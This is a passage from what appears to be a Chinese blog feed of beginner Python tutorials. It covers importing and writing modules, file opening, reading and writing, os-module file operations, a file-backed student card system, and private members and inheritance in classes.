href="#四、模块" class="headerlink" title="四、模块"></a>四、模块</h2><h3 id="1-模块介绍"><a href="#1-模块介绍" class="headerlink" title="1. 模块介绍"></a>1. 模块介绍</h3><ul><li>模块是一个由Python代码组成的文件，就是一个以<code>.py</code>结尾的文件。</li><li>模块包含函数、类和变量，还可以包括可运行的代码。</li><li>模块的主要作用：<ul><li>提高了代码的可维护性</li><li>一个模块编写完毕之后，其他模块直接调用，不用再从零开始写代码了，节约了工作时间</li><li>避免名字冲突</li></ul></li></ul><h3 id="2-模块的导入"><a href="#2-模块的导入" class="headerlink" title="2. 模块的导入"></a>2. 模块的导入</h3><h4 id="2-1-import"><a href="#2-1-import" class="headerlink" title="2.1 import"></a>2.1 import</h4><ul><li>import导入模块，把整个模块都加载进来</li></ul><p>语法格式：</p><pre><code class="python">&quot;&quot;&quot;导入格式：     import 模块名使用格式：     模块名.函数  模块名.类名  模块名.变量名&quot;&quot;&quot;</code></pre><p>示例代码：</p><pre><code class="python"># 导入模块import random# 模块名.函数num = random.randint(1, 3)print(num)# 模块名.类名# 创建对象ran = random.Random()print(type(ran))# 模块名.变量名print(random.TWOPI)</code></pre><h4 id="2-2-from…import导入模块中需要的内容"><a href="#2-2-from…import导入模块中需要的内容" class="headerlink" title="2.2 from…import导入模块中需要的内容"></a>2.2 from…import导入模块中需要的内容</h4><ul><li>from…import可以只导入模块中需要使用的内容</li></ul><p>语法格式：</p><pre><code class="python">&quot;&quot;&quot;导入格式：     from 模块名 import 需使用的函数、类、变量使用格式：     函数、类、变量   无需通过模块名引用&quot;&quot;&quot;</code></pre><p>示例代码：</p><pre><code class="python">from random import randint, Random, TWOPI# 函数num = randint(1, 3)print(num)# 类ran = Random()print(type(ran))# 变量print(TWOPI)</code></pre><h4 id="2-3-from…import导入模块中所有的内容"><a href="#2-3-from…import导入模块中所有的内容" class="headerlink" title="2.3 from…import导入模块中所有的内容"></a>2.3 from…import导入模块中所有的内容</h4><p>语法格式：</p><pre><code class="python">&quot;&quot;&quot;导入格式：     from 模块名 import *使用格式：     函数、类、变量   无需通过模块名引用&quot;&quot;&quot;</code></pre><p>示例代码：</p><pre><code class="python">from random import *# 函数num = randint(1, 3)print(num)# 类ran = Random()print(type(ran))</code></pre><h4 id="2-4-import…as…给导入的模块取别名"><a href="#2-4-import…as…给导入的模块取别名" class="headerlink" title="2.4 import…as…给导入的模块取别名"></a>2.4 import…as…给导入的模块取别名</h4><ul><li>把复杂名字改简单些</li><li>把已经同名的名字改一个不同名的名字</li></ul><p>语法格式：</p><pre><code class="python">&quot;&quot;&quot;模块起别名导入格式：import 模块 as 模块别名使用格式：模块别名.工具(工具指函数、类、变量)模块工具起别名导入格式：from 模块 import 工具 as 工具别名使用格式：工具别名        无需通过模块名引用&quot;&quot;&quot;</code></pre><p>示例代码：</p><pre><code class="python"># 将模块random取别名为rimport random as r# 模块别名.方法num = r.randint(1, 3)print(num)# 模块工具randint取别名为rifrom random import randint as rinum = ri(1, 3)print(num)</code></pre><h4 id="2-5-模块搜索路径"><a href="#2-5-模块搜索路径" class="headerlink" title="2.5 模块搜索路径"></a>2.5 模块搜索路径</h4><p>当你导入一个模块，Python解析器对模块位置的搜索顺序是：</p><ol><li>当前目录</li><li>如果不在当前目录，Python则搜索系统路劲</li><li>模块搜索路径存储在system模块的sys.path变量中。</li></ol><p>示例代码：</p><pre><code class="python">import sys# 模块搜索路径存储在system模块的sys.path变量中print(sys.path)</code></pre><h2 id="五、模块制作"><a href="#五、模块制作" class="headerlink" title="五、模块制作"></a>五、模块制作</h2><h3 id="1-定义自己的模块"><a href="#1-定义自己的模块" class="headerlink" title="1. 定义自己的模块"></a>1. 定义自己的模块</h3><p>在Python中，每个Python文件都可以作为一个模块，模块的名字就是文件的名字。比如有这样一个文件<code>module.py</code>，在<code>module.py</code>中定义了所需的函数：</p><pre><code class="python">def my_add(a, b):    &quot;&quot;&quot;返回2个数相加结果&quot;&quot;&quot;    return a+bdef my_sub(a, b):    &quot;&quot;&quot;返回2个数相减结果&quot;&quot;&quot;    return a-b</code></pre><h3 id="2-调用自己定义的模块"><a href="#2-调用自己定义的模块" class="headerlink" title="2. 调用自己定义的模块"></a>2. 调用自己定义的模块</h3><pre><code class="python">import module   # 导入模块# 调用模块中的函数ret = module.my_add(1, 1)print(ret)ret = module.my_sub(10, 20)print(ret)</code></pre><h3 id="3-测试模块"><a href="#3-测试模块" class="headerlink" title="3. 测试模块"></a>3. 测试模块</h3><h4 id="3-1-测试模块"><a href="#3-1-测试模块" class="headerlink" title="3.1 测试模块"></a>3.1 测试模块</h4><p>在实际开中，当一个开发人员编写完一个模块后，为了让模块能够在项目中达到想要的效果，这个开发人员会自行在模块文件中添加一些测试信息，例如：</p><p>module.py:</p><pre><code>def my_add(a, b):    &quot;&quot;&quot;返回2个数相加结果&quot;&quot;&quot;    return a+bdef my_sub(a, b):    &quot;&quot;&quot;返回2个数相减结果&quot;&quot;&quot;    return a-bret = my_add(2, 2)print(&#39;模块中测试代码：my_add(2, 2) = &#39;, ret)ret = my_sub(10, 2)print(&#39;模块中测试代码：my_sub(10, 2) = &#39;, ret)</code></pre><p>导入模块文件，默认执行模块文件的内容：</p><pre><code class="python">import module </code></pre><h4 id="3-2-模块中的-name"><a href="#3-2-模块中的-name" class="headerlink" title="3.2 模块中的__name__"></a>3.2 模块中的<code>__name__</code></h4><ul><li><p>直接运行此文件，<code>__name__</code>的结果为<code>__main__</code></p></li><li><p>此文件被当做模块文件导入时，<code>__name__</code>的结果不为<code>__main__</code></p></li><li><p>如果不想导包把模块的测试代码也运行，把模块的测试代码放在<code>if __name__ == &#39;__main__&#39;:</code>条件语句里面</p></li></ul><h4 id="4-模块中的-all"><a href="#4-模块中的-all" class="headerlink" title="4. 模块中的__all__"></a>4. 模块中的<code>__all__</code></h4><ul><li><p>模块中<code>__all__</code>变量，<strong>只对</strong><code>from xxx import *</code>这种导入方式有效</p></li><li><p>模块中<code>__all__</code>变量包含的元素，才能会被<code>from xxx import *</code>导入</p></li><li><p><code>__all__</code>格式：</p><pre><code class="python"> __all__ = [&#39;变量名&#39;, &#39;类名&#39;, &#39;函数名&#39;, ……]</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础06-文件操作</title>
      <link href="/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8006-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8006-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="一、文件的作用"><a href="#一、文件的作用" class="headerlink" title="一、文件的作用"></a>一、文件的作用</h2><ul><li>把一些长期存储存放起来，可以让程序下一次执行的时候直接使用，而不必重新制作一份，省时省力<ul><li>持久化储存数据</li></ul></li></ul><a id="more"></a><h2 id="二、文件的打开与关闭"><a href="#二、文件的打开与关闭" class="headerlink" title="二、文件的打开与关闭"></a>二、文件的打开与关闭</h2><h3 id="1-文件操作流程"><a href="#1-文件操作流程" class="headerlink" title="1. 文件操作流程"></a>1. 文件操作流程</h3><ol><li>打开文件，或者新建立一个文件</li><li>读/写数据</li><li>关闭文件</li></ol><h3 id="2-打开文件"><a href="#2-打开文件" class="headerlink" title="2. 打开文件"></a>2. 打开文件</h3><p>在Python，使用open函数，可以打开一个已经存在的文件，或者创建一个新文件：</p><ul><li><pre><code>文件变量 = open(文件名字，访问模式)</code></pre><ul><li>注意：文件名字，访问模式都是字符串格式</li></ul></li></ul><p>示例如下：</p><pre><code class="python"># &#39;w&#39;: 只写方式打开文件，文件不存在创建，文件存在，清空文件内容f = open(&#39;xxx.txt&#39;, &#39;w&#39;)</code></pre><p>说明:</p><table><thead><tr><th align="center">访问模式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">r</td><td align="left">只用于读取, 默认模式。文件不存在,会报错。</td></tr><tr><td align="center">w</td><td align="left">只用于写入。文件存在则先清空内容, 文件不存在，创建新文件。</td></tr></tbody></table><h3 id="3-关闭文件"><a href="#3-关闭文件" class="headerlink" title="3. 关闭文件"></a>3. 关闭文件</h3><h4 id="3-1-手动关闭文件"><a href="#3-1-手动关闭文件" class="headerlink" title="3.1 手动关闭文件"></a>3.1 手动关闭文件</h4><ul><li>关闭文件，为了释放资源</li><li>语法格式：<code>文件变量.close()</code></li></ul><p>示例如下：</p><pre><code class="python"># &#39;w&#39;: 只写方式打开文件，文件不存在创建，文件存在，清空文件内容f = open(&#39;xxx.txt&#39;, &#39;w&#39;)# 关闭文件，为了释放资源# 文件变量.close()f.close()</code></pre><h4 id="3-2-自动关闭文件"><a href="#3-2-自动关闭文件" class="headerlink" title="3.2 自动关闭文件"></a>3.2 自动关闭文件</h4><pre><code class="python">with open(&quot;123.txt&quot;, &quot;w&quot;) as f:    pass  # 执行完缩进代码, 会自动关闭文件</code></pre><h2 id="三、文件的读写"><a href="#三、文件的读写" class="headerlink" title="三、文件的读写"></a>三、文件的读写</h2><h3 id="1-写数据"><a href="#1-写数据" class="headerlink" title="1. 写数据"></a>1. 写数据</h3><ul><li>使用 write() 可以完成向文件写入数据</li><li>语法格式：<code>文件变量.write(所需的内容)</code></li></ul><p>示例代码：</p><pre><code class="python"># 1. 打开文件，只写方式打开f = open(&#39;xxx.txt&#39;, &#39;w&#39;)# 2. 写文件# 写文件格式：文件变量.write(所需的内容)f.write(&#39;hello abc&#39;)f.write(&#39; hello python&#39;)# 3. 关闭文件f.close()</code></pre><h3 id="2-读数据"><a href="#2-读数据" class="headerlink" title="2. 读数据"></a>2. 读数据</h3><h4 id="2-1-read"><a href="#2-1-read" class="headerlink" title="2.1 read"></a>2.1 read</h4><ul><li><p>格式语法：</p><pre><code>内容变量 = 文件变量.read(n)</code></pre><ul><li>n 为读取的字符数，不设置则全部读取</li></ul></li></ul><p>案例演练：</p><ul><li><p><code>xxx.txt</code>文件内容如下：</p><pre><code class="txt">hello abc hello python</code></pre></li><li><p>示例代码：</p></li></ul><pre><code class="python"># 1. 打开文件，只读方式打开，&#39;r&#39;# &#39;r&#39;： 打开文件，必须存在，不存在，报错崩溃f = open(&#39;xxx.txt&#39;, &#39;r&#39;)# 2. 读取文件内容# 格式： 内容变量 = 文件变量.read(读取的长度)#       如果read的长度不指定，默认读取全部ret = f.read(4)  # 读取4个字符print(ret)# 下次，继续接着上一次的位置ret = f.read(7)  # 接着读取7个字符print(ret)ret = f.read()  # 接着读取剩下所有个字符print(ret)# 3. 关闭文件f.close()</code></pre><h4 id="2-2-readlines"><a href="#2-2-readlines" class="headerlink" title="2.2 readlines"></a>2.2 readlines</h4><ul><li><code>readlines()</code> 一次全部读出，读取所有的行，按行作为分隔条件，返回列表 (每行内容是一个元素)</li><li>语法格式：<code>内容列表变量 = 文件变量.readlines()</code></li></ul><p>案例演练：</p><ul><li><p><code>xxx.txt</code>文件内容如下：</p><pre><code class="txt">hello abchello pythonhello mike</code></pre></li><li><p>示例代码：</p></li></ul><pre><code class="python"># 1. 打开文件，只读方式打开，&#39;r&#39;# &#39;r&#39;： 打开文件，必须存在，不存在，报错崩溃f = open(&#39;xxx.txt&#39;, &#39;r&#39;)# 2. 读取文件内容# readlines: 读取所有的行，按行作为分隔条件# 格式：内容列表变量 = 文件变量.readlines()content_list = f.readlines()# &#39;\n&#39;换行符，代表换行print(content_list)# 通过for取出列表的所有元素for v in content_list:    print(v)# 3. 关闭文件f.close()</code></pre><h4 id="2-3-readline"><a href="#2-3-readline" class="headerlink" title="2.3 readline"></a>2.3 readline</h4><ul><li><code>readline()</code> 每次读取一行数据</li><li>语法格式：<code>内容变量 = 文件变量.readline()</code></li></ul><p>案例演练：</p><ul><li><p><code>xxx.txt</code>文件内容如下：</p><pre><code class="txt">hello abchello pythonhello mike</code></pre></li><li><p>示例代码：</p></li></ul><pre><code class="python"># 1. 打开文件，只读方式打开，&#39;r&#39;# &#39;r&#39;： 打开文件，必须存在，不存在，报错崩溃f = open(&#39;xxx.txt&#39;, &#39;r&#39;)# 2. 读取文件内容# readlines： 读取所有的行# readline:   一次读取一行# readline格式：内容变量 = 文件变量.readline()content = f.readline()print(content)content = f.readline()print(content)content = f.readline()print(content)# 3. 关闭文件f.close()</code></pre><h2 id="四、打开文件详解"><a href="#四、打开文件详解" class="headerlink" title="四、打开文件详解"></a>四、打开文件详解</h2><h3 id="1-访问模式说明"><a href="#1-访问模式说明" class="headerlink" title="1. 访问模式说明"></a>1. 访问模式说明</h3><table><thead><tr><th align="center">访问模式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">r</td><td align="left">只用于读取, 默认模式。文件不存在,会报错。</td></tr><tr><td align="center">w</td><td align="left">只用于写入。文件存在则先清空内容, 文件不存在，创建新文件。</td></tr><tr><td align="center">a</td><td align="left">只用于写入。文件存在则追加内容, 文件不存在，创建新文件。</td></tr><tr><td align="center">r+</td><td align="left">用于读写。文件不存在,会报错。</td></tr><tr><td align="center">w+</td><td align="left">用于读写。文件存在则先清空内容, 文件不存在，创建新文件。</td></tr><tr><td align="center">a+</td><td align="left">用于读写。文件存在则追加内容, 文件不存在，创建新文件。</td></tr><tr><td align="center">rb</td><td align="left">二进制格式的只读操作。后续网络课程中具体讲解。</td></tr><tr><td align="center">wb</td><td align="left">二进制格式的只写操作。后续网络课程中具体讲解。</td></tr><tr><td align="center">ab</td><td align="left">二进制格式的追加操作。后续网络课程中具体讲解。</td></tr></tbody></table><h4 id="1-1-只读方式打开文件"><a href="#1-1-只读方式打开文件" class="headerlink" title="1.1 只读方式打开文件"></a>1.1 只读方式打开文件</h4><ul><li>只读方式打开文件，文件不存存在，报错</li></ul><p>示例代码：</p><pre><code class="python"># &#39;r&#39;，只读方式打开文件，文件不存存在，报错f = open(&#39;abc.txt&#39;, &#39;r&#39;)f.close()</code></pre><h4 id="1-2-只写方式打开文件"><a href="#1-2-只写方式打开文件" class="headerlink" title="1.2 只写方式打开文件"></a>1.2 只写方式打开文件</h4><ul><li>只写方式打开文件，文件不存在新建，文件存在清空文件内容</li></ul><p>示例代码：</p><pre><code class="python"># &#39;w&#39;，只写方式打开文件，文件不存在新建，文件存在清空文件内容f = open(&#39;abc.txt&#39;, &#39;w&#39;)f.close()</code></pre><h4 id="1-3-追加方式打开文件"><a href="#1-3-追加方式打开文件" class="headerlink" title="1.3 追加方式打开文件"></a>1.3 追加方式打开文件</h4><ul><li>追加方式打开文件，文件不存在新建，文件存在写光标则放在文件末尾，写数据直接写在文件末尾<ul><li>注意：追加方式打开文件，不会清空文件内容</li></ul></li></ul><p>案例演练：</p><ul><li><p><code>abc.txt</code>文件内容如下：</p><pre><code class="txt">hello abchello pythonhello mike</code></pre></li><li><p>示例代码：</p></li></ul><pre><code class="python"># 1. &#39;a&#39;，追加方式打开文件f = open(&#39;abc.txt&#39;, &#39;a&#39;)# 2. 写数据f.write(&#39;^_~&#39;)# 3. 关闭文件f.close()</code></pre><h3 id="2-打开文件路径说明"><a href="#2-打开文件路径说明" class="headerlink" title="2. 打开文件路径说明"></a>2. 打开文件路径说明</h3><h4 id="2-1-open第一个参数说明"><a href="#2-1-open第一个参数说明" class="headerlink" title="2.1 open第一个参数说明"></a>2.1 open第一个参数说明</h4><ul><li><code>open</code> 第一个参数，实际上是 <strong><code>路径 + 文件名</code></strong></li><li>路径主要分为：绝对路径和相对路径</li></ul><h4 id="2-2-绝对路径和相对路径"><a href="#2-2-绝对路径和相对路径" class="headerlink" title="2.2 绝对路径和相对路径"></a>2.2 绝对路径和相对路径</h4><ul><li><p>绝对路径：是指文件在硬盘上真正存在的路径，是电脑完整的路径</p><ul><li><p>如 windows 平台下：<code>E:\Code\PyCode</code></p></li><li><p>注意：写代码的时候，windows下路径的 <code>\</code> 需要改为 <code>\\</code> 或者改为 <code>/</code></p><pre><code class="python">&#39;E:\\Code\\PyCode\\abc.txt&#39;&#39;E:/Code/PyCode/abc.txt&#39;    # 推荐这种写法</code></pre></li><li><p>一般而言，写程序很少使用到绝对路径，因为程序在本机运行可以找到这个绝对路径，但是，把程序拷贝给别人运行，别人电脑不一定有这个路径</p></li></ul></li><li><p>相对路径：相对于自己的目标文件位置</p></li><li><pre><code>1.txt`：等价于`./1.txt`，当前路径下的`1.txt../1.txt: 上一级路径下的1.txt</code></pre></li></ul><h2 id="五、应用：文件备份案例"><a href="#五、应用：文件备份案例" class="headerlink" title="五、应用：文件备份案例"></a>五、应用：文件备份案例</h2><h3 id="1-功能演示"><a href="#1-功能演示" class="headerlink" title="1. 功能演示"></a>1. 功能演示</h3><ul><li>输入文件的名字，然后程序自动完成对文件进行备份</li></ul><h3 id="2-示例代码"><a href="#2-示例代码" class="headerlink" title="2. 示例代码"></a>2. 示例代码</h3><pre><code class="python">&quot;&quot;&quot;a. 输入需要拷贝的文件名 old_file_name = input()b. 找文件名字右边的第一个点，通过切片组装成： 旧文件名[备份].后缀1. 只读方式打开源文件(旧文件)2. 只写方式打开新的备份文件(新文件)3. while True:    4. 一次读取一点源文件的内容    5. 如果读取的内容，往写文件中写    6. 如果没有读到内容，文件已经读取完毕，break跳出循环7. 关闭文件&quot;&quot;&quot;# a. 输入需要拷贝的文件名 old_file_name = input()old_file_name = input(&#39;输入需要拷贝的文件名: &#39;)# b. 找文件名字右边的第一个点，通过切片组装成： 旧文件名[备份].后缀# 找文件名字右边的第一个点，rfind， r为right, 从右往左找pos = old_file_name.rfind(&#39;.&#39;)new_file_name = old_file_name[0:pos] + &#39;[备份]&#39; + old_file_name[pos:]# 1. 只读方式打开源文件(旧文件)，加上&#39;b&#39;选项，二进制的意思，为了处理任何类型的文件src_f = open(old_file_name, &#39;rb&#39;)# 2. 只写方式打开新的备份文件(新文件)，加上&#39;b&#39;选项，二进制的意思，为了处理任何类型的文件dst_f = open(new_file_name, &#39;wb&#39;)# 3. while True:while True:    # 4. 一次读取一点源文件的内容    ret = src_f.read(1024)    # 5. 如果读取的内容，往写文件中写    if ret:        dst_f.write(ret)    # 6. 如果没有读到内容，文件已经读取完毕，break跳出循环    else:        break# 5. 关闭文件src_f.close()dst_f.close()</code></pre><h2 id="六、文件的相关操作"><a href="#六、文件的相关操作" class="headerlink" title="六、文件的相关操作"></a>六、文件的相关操作</h2><h3 id="1-文件的相关操作"><a href="#1-文件的相关操作" class="headerlink" title="1. 文件的相关操作"></a>1. 文件的相关操作</h3><p>有些时候，需要对文件进行重命名、删除等一些操作，Python的 os 模块中都有这么功能</p><p>操作流程：</p><pre><code class="python"># 1. 导入模块，只需导入一次即可import os# 2. 使用os中的方法，完成功能os.方法名()</code></pre><h4 id="1-1-文件重命名"><a href="#1-1-文件重命名" class="headerlink" title="1.1 文件重命名"></a>1.1 文件重命名</h4><ul><li>os模块中的rename()可以完成对文件的重命名操作</li><li>语法格式：<code>os.rename(旧的文件名，新的文件名)</code></li></ul><pre><code class="python">import osos.rename(&quot;毕业论文.txt&quot;, &quot;毕业论文-最终版.txt&quot;)</code></pre><h4 id="1-2-删除文件"><a href="#1-2-删除文件" class="headerlink" title="1.2 删除文件"></a>1.2 删除文件</h4><ul><li>os模块中的remove()可以完成对文件的删除操作，不能删除文件夹</li><li>语法格式：<code>os.remove(待删除的文件名)</code></li></ul><pre><code class="python">import osos.remove(&quot;毕业论文.txt&quot;)</code></pre><h4 id="1-3-创建文件夹"><a href="#1-3-创建文件夹" class="headerlink" title="1.3 创建文件夹"></a>1.3 创建文件夹</h4><ul><li>创建文件夹，只能创建文件夹，不能创建普通文件</li><li>语法格式：<code>os.mkdir(文件夹的名字)</code></li></ul><pre><code class="python">import osos.mkdir(&quot;张三&quot;)</code></pre><h4 id="1-4-删除空文件夹"><a href="#1-4-删除空文件夹" class="headerlink" title="1.4 删除空文件夹"></a>1.4 删除空文件夹</h4><ul><li>删除文件夹，只能删除空的文件夹</li><li>语法格式：<code>os.rmdir(待删除文件夹的名字)</code></li></ul><pre><code class="python">import osos.rmdir(&quot;张三&quot;)</code></pre><h4 id="1-5-获取当前目录"><a href="#1-5-获取当前目录" class="headerlink" title="1.5 获取当前目录"></a>1.5 获取当前目录</h4><ul><li>获取当前工作的路径</li><li>语法格式：<code>路径变量 = os.getcwd()</code></li></ul><pre><code class="python">import oswork_path = os.getcwd()print(work_path)</code></pre><h4 id="1-6-改变默认目录"><a href="#1-6-改变默认目录" class="headerlink" title="1.6 改变默认目录"></a>1.6 改变默认目录</h4><ul><li>改变默认目录，切换指定的路径</li><li>语法格式：<code>os.chdir(改变的路径)</code></li></ul><pre><code class="python">import osos.chdir(&quot;../&quot;)  # 切换到上一级路径</code></pre><h4 id="1-7-获取目录列表"><a href="#1-7-获取目录列表" class="headerlink" title="1.7 获取目录列表"></a>1.7 获取目录列表</h4><ul><li><p>获取某个目录的文件信息，获取文件夹或文件的名字</p></li><li><p>语法格式：</p><pre><code>目录列表变量 = os.listdir(指定某个目录)</code></pre><ul><li>如果不指定目录，默认当前路径</li></ul></li></ul><pre><code class="python">import ostemp_list = os.listdir()  # 获取当前目录下的文件信息print(temp_list)</code></pre><h4 id="1-8-判断文件是否存在"><a href="#1-8-判断文件是否存在" class="headerlink" title="1.8 判断文件是否存在"></a>1.8 判断文件是否存在</h4><ul><li><p>语法格式：</p><pre><code>os.path.exists(需要判断的文件)</code></pre><ul><li>如果文件存在返回<code>True</code>，如果文件不存在返回<code>False</code></li></ul></li></ul><pre><code class="python">import osret = os.path.exists(&#39;1.txt&#39;)print(ret)</code></pre><h3 id="2-应用：批量修改文件名"><a href="#2-应用：批量修改文件名" class="headerlink" title="2. 应用：批量修改文件名"></a>2. 应用：批量修改文件名</h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><pre><code class="python">&quot;&quot;&quot;1. 获取pytest的目录信息，返回文件名的列表2. 切换到目标路径3. for遍历文件名的列表取出某个元素4. 对这个元素重命名&quot;&quot;&quot;import os# 1. 获取pytest的目录信息，返回文件名的列表name_list = os.listdir(&#39;pytest&#39;)# print(name_list)# 2. 路径切换os.chdir(&quot;pytest&quot;)# 3. for遍历取出文件名的列表某个元素for name in name_list:    # print(name)    # 4. 对这个元素重命名    new_name = &#39;[黑马出品]-&#39; + name    os.rename(name, new_name)</code></pre><h2 id="七、文件版学生名片管理系统"><a href="#七、文件版学生名片管理系统" class="headerlink" title="七、文件版学生名片管理系统"></a>七、文件版学生名片管理系统</h2><h3 id="1-字符串、容器类型相互转换"><a href="#1-字符串、容器类型相互转换" class="headerlink" title="1. 字符串、容器类型相互转换"></a>1. 字符串、容器类型相互转换</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>str(容器变量)</td><td>将 容器变量 转换为一个字符串</td></tr><tr><td>eval( 字符串内容 )</td><td>返回传入字符串内容的结果，字符串里面看到像是什么，就转换成什么</td></tr></tbody></table><p>示例代码：</p><pre><code class="python"># 列表user_list = [{&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: 110},             {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 30, &#39;tel&#39;: 120}]# 列表转字符串temp_str = str(user_list)print(temp_str, type(temp_str))# 字符串my_str = &quot;[{&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: 110}, {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 30, &#39;tel&#39;: 120}]&quot;# 字符串转列表# eval()， 看到像什么，就转换什么my_list = eval(my_str)print(my_list, type(my_list))</code></pre><p>运行结果：</p><pre><code class="shell">[{&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: 110}, {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 30, &#39;tel&#39;: 120}] [{&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;tel&#39;: 110}, {&#39;name&#39;: &#39;yoyo&#39;, &#39;age&#39;: 30, &#39;tel&#39;: 120}] </code></pre><h3 id="2-文件版学生名片管理系统"><a href="#2-文件版学生名片管理系统" class="headerlink" title="2. 文件版学生名片管理系统"></a>2. 文件版学生名片管理系统</h3><h4 id="2-1-保存数据"><a href="#2-1-保存数据" class="headerlink" title="2.1 保存数据"></a>2.1 保存数据</h4><pre><code class="python">def save_info():    &quot;&quot;&quot;名片信息保存到文件&quot;&quot;&quot;    # 1. 通过with打开文件，自动处理关闭    with open(&#39;stu.txt&#39;, &#39;w&#39;) as f:        # 2. 将列表转换为字符串后，再往文件中写        f.write(str(user_list))</code></pre><h4 id="2-2-读取数据"><a href="#2-2-读取数据" class="headerlink" title="2.2 读取数据"></a>2.2 读取数据</h4><pre><code class="python">def load_info():    &quot;&quot;&quot;加载数据&quot;&quot;&quot;    # 1 判断文件是否存在，不存在，中断函数    # 文件开头需要 import os    if not os.path.exists(&#39;stu.txt&#39;):        print(&#39;文件不存在，无法加载&#39;)        return    # 2 文件存在的时候，加载数据    # 2.1 通过with打开文件，只读方式打开文件    with open(&#39;stu.txt&#39;, &#39;r&#39;) as f:        # 2.2 文件变量.read()读取所有内容，返回内容是字符串类型        content = f.read()        # 2.3 global 声明user_list全局变量        global user_list        # 2.4 把读取内容通过eval转换成列表，给全局变量的列表赋值        user_list = eval(content)        print(&#39;数据成功加载&#39;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础08-面向对象2：继承、属性、方法</title>
      <link href="/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8008-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A12%EF%BC%9A%E7%BB%A7%E6%89%BF%E3%80%81%E5%B1%9E%E6%80%A7%E3%80%81%E6%96%B9%E6%B3%95/"/>
      <url>/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8008-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A12%EF%BC%9A%E7%BB%A7%E6%89%BF%E3%80%81%E5%B1%9E%E6%80%A7%E3%80%81%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象2：继承、属性、方法"><a href="#面向对象2：继承、属性、方法" class="headerlink" title="面向对象2：继承、属性、方法"></a>面向对象2：继承、属性、方法</h1><h2 id="一、私有权限"><a href="#一、私有权限" class="headerlink" title="一、私有权限"></a>一、私有权限</h2><h3 id="1-面向对象的特性"><a href="#1-面向对象的特性" class="headerlink" title="1. 面向对象的特性"></a>1. 面向对象的特性</h3><a id="more"></a><ol><li>面向对象的的三大特性：封装、继承、多态</li><li>面向对象的封装特性：<ul><li>将属性和方法放到一起封装成一个整体，然后通过实例化对象来处理</li><li>对类的属性和方法增加访问权限控制</li></ul></li></ol><h3 id="2-私有属性"><a href="#2-私有属性" class="headerlink" title="2. 私有属性"></a>2. 私有属性</h3><ul><li>如果在属性名前面加了2个下划线’__’，则表明该属性是私有属性，否则为公有属性</li><li><strong>私有属性只能在类的内部访问</strong></li></ul><pre><code class="python">&quot;&quot;&quot;私有属性：    1. __(2个下划线)开头的属性，就是私有属性    2. 只能在本类的内部访问，在类的外面无法直接访问&quot;&quot;&quot;class Dog(object):    # 添加属性    def __init__(self):        self.__baby_count = 0   # 私有属性，以__(2个下划线)开头的属性        self.age = 1    # 公有属性    def print_info(self):        print(self.__baby_count)# 类的外部# 创建对象dog1 = Dog()# print(dog1.__baby_count) # err, 私有属性，在类的外面无法直接访问print(dog1.age)dog1.print_info()</code></pre><h3 id="3-私有方法"><a href="#3-私有方法" class="headerlink" title="3. 私有方法"></a>3. 私有方法</h3><ul><li>私有方法和私有属性类似，在方法名前面加了2个下划线’__’，则表明该方法是私有方法</li><li><strong>私有方法只能在类内部使用</strong></li></ul><pre><code class="python">&quot;&quot;&quot;私有方法：    1. __(2个下划线)开头的方法，就是私有方法    2. 只能在本类的内部访问，在类的外面无法直接访问    3. 在类的内部调用实例方法的语法格式：self.方法名()&quot;&quot;&quot;class Dog(object):    def __init__(self):        self.__baby_count = 0 # 私有属性，以__(2个下划线)开头的属性        self.age = 1    def print_info(self):        print(self.__baby_count)        self.__leave()    # 定义一个私有方法    def __leave(self):        print(&#39;休产假了&#39;)dog1 = Dog()dog1.print_info()# AttributeError: &#39;Dog&#39; object has no attribute &#39;__leave&#39;# dog1.__leave() # err, 外部不能访问私有方法</code></pre><h2 id="二、继承的作用"><a href="#二、继承的作用" class="headerlink" title="二、继承的作用"></a>二、继承的作用</h2><h3 id="1-继承的作用"><a href="#1-继承的作用" class="headerlink" title="1. 继承的作用"></a>1. 继承的作用</h3><ul><li>继承：子类直接具备父类的能力（属性和方法）</li><li>作用：解决代码重用问题，提高开发效率</li></ul><h3 id="2-继承的语法格式"><a href="#2-继承的语法格式" class="headerlink" title="2. 继承的语法格式"></a>2. 继承的语法格式</h3><p>继承的语法格式：</p><pre><code class="python">class 子类名(父类名)：    pass</code></pre><p>示例代码：</p><pre><code class="python"># 定义一个父类class Father(object):    # 添加一个属性， money    def __init__(self):        self.money = 9999999    def print_info(self):        print(self.money)# 定义一个子类，继承与Fatherclass Son(Father):    pass# 子类创建对象s = Son()print(s.money)  # 子类私用继承过来的属性s.print_info()  # 子类使用继承过来的方法</code></pre><p><strong>注意：</strong></p><ul><li>子类对象调用方法有一个就近原则<ul><li>如果本类能找到方法，直接调用本类的方法</li><li>如果本类找不到，则调用父类继承过来的方法</li></ul></li></ul><h2 id="三、单继承和多层继承"><a href="#三、单继承和多层继承" 